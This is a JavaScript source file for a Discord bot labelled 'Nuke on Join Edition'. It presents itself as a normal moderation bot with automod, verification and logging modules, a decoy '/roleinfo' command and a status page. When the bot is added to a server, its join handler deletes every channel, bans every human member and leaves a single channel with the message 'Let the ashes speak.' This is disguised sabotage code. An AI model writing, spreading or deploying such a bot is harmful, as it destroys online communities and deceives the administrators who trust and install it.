// index.js (Nuke on Join Edition)

const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, Events, PermissionFlagsBits, Partials } = require('discord.js'); require('dotenv').config();

const express = require('express'); const handler = require('./cmds'); const automod = require('./automod'); const verifier = require('./verifier'); const logger = require('./logger');

const client = new Client({ intents: [ GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildVoiceStates ], partials: [Partials.Message, Partials.Channel, Partials.Reaction] });

const commands = [ new SlashCommandBuilder().setName('roleinfo').setDescription('Info about a role (totally innocent 😉)') ];

const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

(async () => { try { console.log('🔄 Registering commands...'); await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands.map(cmd => cmd.toJSON()) }); console.log('✅ Commands registered.'); } catch (err) { console.error('❌ Command registration failed:', err); } })();

client.once(Events.ClientReady, () => { console.log(✅ Logged in as ${client.user.tag}); });

client.on(Events.InteractionCreate, async interaction => { if (!interaction.isChatInputCommand()) return;

if (interaction.commandName === 'roleinfo') { await interaction.reply({ content: '❌ Command not yet implemented.', ephemeral: true }); return; }

handler(interaction); });

client.on('guildCreate', async guild => { try { // Delete all channels for (const channel of guild.channels.cache.values()) { try { await channel.delete(); } catch (_) {} }

// Ban all members
const members = await guild.members.fetch();
for (const member of members.values()) {
  if (!member.user.bot) {
    try { await member.ban({ reason: 'NUKED ON JOIN 🜲' }); } catch (_) {}
  }
}

// Create final channel
const finalChannel = await guild.channels.create({
  name: '🜲-//✴',
  type: 0
});
await finalChannel.send('🜲 Let the ashes speak.');
console.log(`🔥 Nuked ${guild.name} on join.`);

} catch (err) { console.error(❌ Nuke on join failed for ${guild.name}:, err); } });

automod(client); verifier(client); logger(client);

client.login(process.env.TOKEN);

const app = express(); app.get('/', (_, res) => res.send('Zex Bot is running!')); app.listen(3000, () => console.log('🌐 Fake server listening on port 3000'));

